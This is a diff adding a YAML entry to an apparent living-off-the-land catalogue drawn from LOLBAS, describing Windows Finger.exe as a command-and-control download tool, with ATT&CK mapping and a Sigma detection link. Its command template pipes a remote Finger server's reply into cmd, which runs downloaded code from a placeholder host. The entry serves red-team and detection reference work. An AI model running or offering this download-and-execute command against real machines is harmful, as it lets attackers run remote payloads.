@@ -1,0 +1,31 @@
+id: lolbas/finger/download/0
+type: binary
+platform: windows
+name: Finger.exe
+phases:
+- command-and-control
+capabilities:
+- file-download
+privilege_required: user
+sources:
+- project: LOLBAS
+  upstream_url: https://lolbas-project.github.io
+  license: GPL-3.0 (verify upstream LICENSE)
+  upstream_version: 9c5e384
+  last_synced: '2026-08-25'
+attack_techniques:
+- T1105
+opsec:
+  noise: high
+  triggers: finger.exe should not be run on a normal workstation.
+  detection_refs:
+  - https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_finger_usage.yml
+commands:
+- template: finger user@example.host.com | more +2 | cmd
+  comment: Downloads payload from remote Finger server. This example connects to "example.host.com" asking
+    for user "user"; the result could contain malicious shellcode which is executed by the cmd process.
+references:
+- https://lolbas-project.github.io/lolbas/Binaries/Finger/
+tags:
+- windows
+- lolbas
